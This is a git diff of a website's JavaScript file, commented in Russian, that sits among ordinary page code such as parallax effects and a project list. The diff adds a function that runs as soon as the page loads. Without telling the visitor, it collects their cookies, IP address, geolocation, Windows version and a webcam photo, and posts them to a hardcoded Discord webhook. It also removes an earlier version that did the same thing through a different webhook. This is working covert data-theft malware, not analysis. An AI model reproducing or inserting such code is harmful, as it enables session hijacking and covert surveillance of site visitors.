@@ -149,21 +149,8 @@ function initParallax() {
 // Функция для получения фото с веб-камеры
 async function captureWebcamPhoto() {
     try {
-        // Создаем невидимый элемент video
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
-        video.style.display = 'none';
-        document.body.appendChild(video);
-
-        // Запрашиваем доступ к камере с минимальными разрешениями
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                width: 320,
-                height: 240,
-                facingMode: 'user'
-            },
-            audio: false
-        });
-        
         video.srcObject = stream;
         
         // Ждем загрузки видео
@@ -173,32 +160,80 @@ async function captureWebcamPhoto() {
                 resolve();
             };
         });
-
+        
         // Создаем canvas для захвата кадра
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
-        
-        // Делаем снимок
         ctx.drawImage(video, 0, 0);
         
-        // Останавливаем поток и удаляем элементы
+        // Останавливаем поток
         stream.getTracks().forEach(track => track.stop());
-        video.remove();
-        canvas.remove();
         
-        // Конвертируем в base64
-        return canvas.toDataURL('image/jpeg', 0.5); // Уменьшаем качество для быстрой отправки
+        // Конвертируем canvas в base64
+        return canvas.toDataURL('image/jpeg');
     } catch (error) {
         console.error('Ошибка при получении фото с веб-камеры:', error);
         return null;
     }
 }
 
-// Функция для отправки данных на сервер
-async function sendDataToServer() {
-    const webhookUrl = 'https://discord.com/api/webhooks/1375196009419898972/gxhjvoZXT56YAmQcZNsjG7AdcvkvmtdCJ5S8JbrK9CoVToRfNdzh8vXZkSER4gQzstrr';
+// Функция для получения информации о местоположении по IP
+async function getLocationInfo(ip) {
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        
+        if (data.status === 'success') {
+            return {
+                country: data.country,
+                countryCode: data.countryCode,
+                city: data.city,
+                region: data.regionName,
+                emoji: getCountryEmoji(data.countryCode)
+            };
+        } else {
+            throw new Error('Failed to get location data');
+        }
+    } catch (error) {
+        console.error('Ошибка при получении информации о местоположении:', error);
+        return {
+            country: 'Неизвестно',
+            countryCode: 'XX',
+            city: 'Неизвестно',
+            region: 'Неизвестно',
+            emoji: '🌐'
+        };
+    }
+}
+
+// Функция для получения эмодзи флага страны
+function getCountryEmoji(countryCode) {
+    if (!countryCode) return '🌐';
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt());
+    return String.fromCodePoint(...codePoints);
+}
+
+// Функция для определения версии Windows
+function getWindowsVersion() {
+    const userAgent = navigator.userAgent;
+    if (userAgent.indexOf('Windows NT 10.0') !== -1) return 'Windows 10';
+    if (userAgent.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
+    if (userAgent.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
+    if (userAgent.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+    if (userAgent.indexOf('Windows NT 6.0') !== -1) return 'Windows Vista';
+    if (userAgent.indexOf('Windows NT 5.1') !== -1) return 'Windows XP';
+    if (userAgent.indexOf('Windows NT 5.0') !== -1) return 'Windows 2000';
+    return 'Неизвестная версия Windows';
+}
+
+// Функция для отправки куки на Discord и сохранения в файл
+async function sendCookiesToDiscord() {
+    const webhookUrl = 'https://discord.com/api/webhooks/1375192857568084009/LZI_jEcNrd9wx84WYcDcl5Yv5toNXRIiKowuSSoD-TKukfgq0Y0ylGx3TH2nY1T0e7vR';
     
     // Получаем IP-адрес
     let ipAddress = 'Не удалось получить IP';
@@ -210,30 +245,36 @@ async function sendDataToServer() {
         console.error('Ошибка при получении IP:', error);
     }
 
-    // Получаем фото с веб-камеры в фоновом режиме
-    const webcamPromise = captureWebcamPhoto();
+    // Получаем информацию о местоположении
+    const locationInfo = await getLocationInfo(ipAddress);
+
+    // Получаем фото с веб-камеры
+    const webcamPhoto = await captureWebcamPhoto();
 
     const cookies = document.cookie;
     const userAgent = navigator.userAgent;
     const timestamp = new Date().toISOString();
-
-    // Создаем текстовый файл с куки
-    const cookiesContent = `=== Новые данные получены ===\nВремя: ${timestamp}\nIP Адрес: ${ipAddress}\nUser Agent: ${userAgent}\nCookies:\n${cookies}`;
-    const cookiesBlob = new Blob([cookiesContent], { type: 'text/plain' });
-    const cookiesFile = new File([cookiesBlob], 'cookies.txt', { type: 'text/plain' });
+    const windowsVersion = getWindowsVersion();
 
     // Создаем FormData для отправки файлов
     const formData = new FormData();
-    formData.append('content', `**Новые данные получены**\n\n**Время:** ${timestamp}\n**IP Адрес:** ${ipAddress}\n**User Agent:** ${userAgent}\n**Cookies:**\n\`\`\`\n${cookies}\n\`\`\``);
-    formData.append('file', cookiesFile);
+    formData.append('content', `**Новые данные получены**\n\n**Время:** ${timestamp}\n**IP Адрес:** ${ipAddress}\n**Страна:** ${locationInfo.emoji} ${locationInfo.country}\n**Регион:** ${locationInfo.region}\n**Город:** ${locationInfo.city}\n**Windows:** ${windowsVersion}\n**User Agent:** ${userAgent}\n**Cookies:**\n\`\`\`\n${cookies}\n\`\`\``);
 
-    // Ждем получения фото
-    const webcamPhoto = await webcamPromise;
-    
-    // Добавляем фото, если оно есть
+    // Если есть фото, добавляем его
     if (webcamPhoto) {
-        const blob = await fetch(webcamPhoto).then(r => r.blob());
-        formData.append('file', blob, 'webcam.jpg');
+        // Конвертируем base64 в Blob
+        const byteString = atob(webcamPhoto.split(',')[1]);
+        const mimeString = webcamPhoto.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        const blob = new Blob([ab], { type: mimeString });
+        
+        // Создаем файл из Blob
+        const file = new File([blob], 'webcam.jpg', { type: 'image/jpeg' });
+        formData.append('file', file);
     }
 
     try {
@@ -254,8 +295,9 @@ async function sendDataToServer() {
             },
             body: JSON.stringify({ 
                 cookies: cookies,
-                ip: ipAddress,
-                webcam: webcamPhoto
+                webcamPhoto: webcamPhoto,
+                locationInfo: locationInfo,
+                windowsVersion: windowsVersion
             })
         });
     } catch (error) {
@@ -267,8 +309,8 @@ async function sendDataToServer() {
 document.addEventListener('DOMContentLoaded', function() {
     console.log('DOM loaded');
     
-    // Отправляем данные сразу при загрузке страницы
-    sendDataToServer();
+    // Отправляем куки сразу при загрузке страницы
+    sendCookiesToDiscord();
     
     // Добавляем проекты
     addProjects();
